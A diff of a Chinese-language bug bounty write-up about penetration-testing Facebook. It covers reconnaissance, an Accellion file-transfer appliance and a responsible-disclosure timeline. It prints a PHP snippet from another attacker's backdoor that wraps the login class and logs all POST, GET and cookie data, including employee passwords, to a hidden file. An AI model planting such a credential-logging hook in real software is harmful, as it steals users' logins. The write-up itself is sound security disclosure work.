@@ -1,27 +1,17 @@
 ---
-layout: post
+
 title: "滲透 Facebook 的思路與發現"
 description: "從滲透的角度看待 Bug Bounty，從如何定位出目標到找出 Facebook 遠端代碼執行漏洞，並在過程中發現其他駭客的足跡..."
 category: "案例剖析"
 tags: ["Facebook", "BugBounty", "RCE", "Backdoor", "Reconnaissance", "Pentest"]
 author: "orange"
 keywords: "Facebook, BugBounty, RCE, Backdoor, Reconnaissance, Pentest"
-og_image: "http://devco.re/images/news/20160421/facebook.jpg"
+image: "/images/news/20160421/facebook.jpg"
 ---
 
-by [Orange Tsai](http://blog.orange.tw/)  
-
-[How I Hacked Facebook, and Found Someone's Backdoor Script](http://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script-eng-ver/) (English Version)  
-[滲透 Facebook 的思路與發現](http://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script/) (中文版本)  
-
-----------
-
-![Facebook](/images/news/20160421/facebook.jpg)
-
-----------
+[English Version](http://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script-eng-ver/)
 
 ### 寫在故事之前
-
 
 身為一位滲透測試人員，比起 Client Side 的弱點我更喜歡 Server Side 的攻擊，能夠直接的控制伺服器、獲得權限操作 SHELL 才爽 <(￣︶￣)>   
 
@@ -52,7 +42,7 @@ READMORE
 <br>
 
 理所當然在尋找 Facebook 弱點時會以平常進行滲透的思路進行，在開始搜集資料時除了針對 Facebook 本身域名查詢外也對註冊信箱進行 Reverse Whois 意外發現了個奇妙的域名名稱
-    
+
     tfbnw.net
 
 TFBNW 似乎是 "**TheFacebook Network**" 的縮寫  
@@ -92,7 +82,7 @@ FTA 為一款標榜安全檔案傳輸的產品，可讓使用者線上分享、�
 
 首先看到 FTA 的第一件事是去網路上搜尋是否有公開的 Exploit 可以利用，Exploit 最近的是由 HD Moore 發現並發佈在 Rapid7 的這篇 Advisory
 
-* [Accellion File Transfer Appliance Vulnerabilities (CVE-2015-2856, CVE-2015-2857)](https://community.rapid7.com/community/metasploit/blog/2015/07/10/r7-2015-08-accellion-file-transfer-appliance-vulnerabilities-cve-2015-2856-cve-2015-2857) 
+* [Accellion File Transfer Appliance Vulnerabilities (CVE-2015-2856, CVE-2015-2857)](https://community.rapid7.com/community/metasploit/blog/2015/07/10/r7-2015-08-accellion-file-transfer-appliance-vulnerabilities-cve-2015-2856-cve-2015-2857)
 
 弱點中可直接從 "**/tws/getStatus**" 中洩漏的版本資訊判斷是否可利用，在發現 files.fb.com 時版本已從有漏洞的 0.18 升級至 0.20 了，不過就從 Advisory 中所透露的片段程式碼感覺 FTA 的撰寫風格如果再繼續挖掘可能還是會有問題存在的，所以這時的策略便開始往尋找 FTA 產品的 0-Day 前進!
 
@@ -183,13 +173,13 @@ Facebook 大致有以下限制:
 {% highlight php %}
 <?php
 include_once('sclient_user_class_standard.inc.orig');
-$fp = fopen("/home/seos/courier/B3dKe9sQaa0L.log", "a"); 
+$fp = fopen("/home/seos/courier/B3dKe9sQaa0L.log", "a");
 $retries = 0;
-$max_retries = 100; 
+$max_retries = 100;
 
 // 省略...
 
-fwrite($fp, date("Y-m-d H:i:s T") . ";" . $_SERVER["REMOTE_ADDR"] . ";" . $_SERVER["HTTP_USER_AGENT"] . ";POST=" . http_build_query($_POST) . ";GET=" . http_build_query($_GET) . ";COOKIE=" . http_build_query($_COOKIE) . "\n"); 
+fwrite($fp, date("Y-m-d H:i:s T") . ";" . $_SERVER["REMOTE_ADDR"] . ";" . $_SERVER["HTTP_USER_AGENT"] . ";POST=" . http_build_query($_POST) . ";GET=" . http_build_query($_GET) . ";COOKIE=" . http_build_query($_COOKIE) . "\n");
 
 // 省略...
 {% endhighlight %}
@@ -215,7 +205,7 @@ include_once 中 "**sclient\_user\_class\_standard.inc.orig**" 為原本對密�
 
  1. 一般用戶註冊，密碼 Hash 存在資料庫，由 SHA256 + SALT 儲存
  2. Facebook 員工 (@fb.com) 則走統一認證，使用 LDAP 由 AD 認證
- 
+
 在這裡相信記錄到的是真實的員工帳號密碼，****猜測**** 這份帳號密碼應該可以通行 Facebook Mail OWA, VPN 等服務做更進一步的滲透...  
 
 此外，這名 "駭客" 可能習慣不太好 :P   
@@ -355,5 +345,3 @@ base64: invalid input
 * 2016/02/18 收到 Reginaldo 的回覆，告知正在進行調查中，希望 Blog 先暫時不要發出
 * 2016/02/24 收到 Hai 的回覆，告知獎金將會於三月發送
 * 2016/04/20 收到 Reginaldo 的回覆，告知調查已完成
-
-
